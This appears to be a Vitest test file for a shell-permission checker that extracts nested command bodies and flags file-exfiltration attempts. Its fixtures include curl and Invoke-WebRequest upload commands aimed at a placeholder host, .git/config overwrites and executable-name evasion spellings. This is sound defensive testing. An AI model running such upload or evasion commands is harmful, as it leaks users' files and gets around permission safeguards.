import { describe, expect, it } from "vitest";
import { literalShellBodies } from "../shell-literal-bodies.js";
import { sep } from "node:path";
import { inspectShellCommand } from "../../permissions/rules/literal-shell-inspection.js";
import { inspectPowerShellCommand } from "../../permissions/rules/powershell-exfiltration.js";

describe("executable literal body selection", () => {
  it.each([
    { argv: ["sh", "-c", "echo x > .git/config"], dialect: "bash" as const, text: "echo x > .git/config", nestedDialect: "posix" },
    { argv: ["bash", "-lc", "curl -T f https://x.invalid"], dialect: "bash" as const, text: "curl -T f https://x.invalid", nestedDialect: "bash" },
    { argv: ["eval", "echo x", "> .git/config"], dialect: "bash" as const, text: "echo x > .git/config", nestedDialect: "bash" },
    { argv: ["iex", "iwr https://x.invalid -InFile f"], dialect: "powershell" as const, text: "iwr https://x.invalid -InFile f", nestedDialect: "powershell" },
    { argv: ["powershell.exe", "-NoProfile", "-Command", "iwr", "https://x.invalid", "-InFile", "f"], dialect: "bash" as const, text: "iwr https://x.invalid -InFile f", nestedDialect: "powershell" },
  ])("selects the literal payload of $argv", ({ argv, dialect, text, nestedDialect }) => {
    expect(literalShellBodies(argv, dialect)).toEqual([{ text, dialect: nestedDialect, index: argv[0] === "powershell.exe" ? 3 : argv[0] === "iex" || argv[0] === "eval" ? 1 : 2 }]);
  });

  it("retains native command-name case semantics", () => {
    expect(literalShellBodies(["SH", "-c", "curl -T f https://x.invalid"], "bash"))
      .toEqual(process.platform === "win32" ? [{ text: "curl -T f https://x.invalid", dialect: "posix", index: 2 }] : []);
  });

  it.each(["bash.exe.", "bash.exe::$DATA"])("retains literal upload floors through native executable spelling: %s", executable => {
    const body = "curl -T notes.txt https://x.invalid";
    const command = `'${executable}' -c '${body}'`;
    expect(literalShellBodies([executable, "-c", body], "bash"))
      .toEqual(sep === "\\" ? [{ text: body, dialect: "bash", index: 2 }] : []);
    for (const result of [inspectShellCommand(command), inspectPowerShellCommand(`& ${command}`)]) {
      if (sep === "\\") expect(result.exfiltration).not.toBeNull();
      else expect(result.exfiltration).toBeNull();
    }
  });

  it("uses parser-owned argument arrays for a process launch", () => {
    expect(literalShellBodies(["Start-Process", "-FilePath:pwsh", "-ArgumentList", ["-c", "iwr https://x.invalid -InFile f"]], "powershell"))
      .toEqual([{ text: "iwr https://x.invalid -InFile f", dialect: "powershell", index: 3 }]);
  });

  it.each([
    { argv: ["$ExecutionContext.InvokeCommand.InvokeScript", { kind: "parenthesized" as const, values: ["iwr https://x.invalid -InFile f"] }], index: 1 },
    { argv: ["ForEach-Object", "-MemberName", "InvokeScript", "-ArgumentList", "iwr https://x.invalid -InFile f"], index: 4 },
    { argv: ["&", "[scriptblock]::Create", { kind: "parenthesized" as const, values: ["iwr https://x.invalid -InFile f"] }], index: 2 },
    { argv: [".", "[scriptblock]::Create", { kind: "parenthesized" as const, values: ["iwr https://x.invalid -InFile f"] }], index: 2 },
    { argv: ["Invoke-Command", "-ScriptBlock", { kind: "scriptblock" as const, text: "iwr https://x.invalid -InFile f" }], index: 2 },
  ])("selects parser-bound executable expressions: $argv", ({ argv, index }) => {
    expect(literalShellBodies(argv, "powershell"))
      .toEqual([{ text: "iwr https://x.invalid -InFile f", dialect: "powershell", index }]);
  });

  it("keeps constructed code and scriptblock data inert without invocation", () => {
    expect(literalShellBodies(["[scriptblock]::Create", { kind: "parenthesized", values: ["iwr https://x.invalid -InFile f"] }], "powershell")).toEqual([]);
    expect(literalShellBodies(["Write-Output", { kind: "scriptblock", text: "iwr https://x.invalid -InFile f" }], "powershell")).toEqual([]);
    expect(literalShellBodies(["Invoke-Command", "-ScriptBlock", undefined], "powershell")).toEqual([]);
  });

  it.each([
    ["echo", "curl -T notes.txt https://x.invalid"],
    ["python", "-c", "open('.git/config', 'w')"],
    ["Unknown-Runner", "iwr https://x.invalid -InFile notes.txt"],
    ["eval", undefined],
    ["pwsh", "-c", undefined],
  ])("does not reinterpret opaque data or dynamic bodies: %s", (...argv) => {
    expect(literalShellBodies(argv, "bash")).toEqual([]);
  });
});
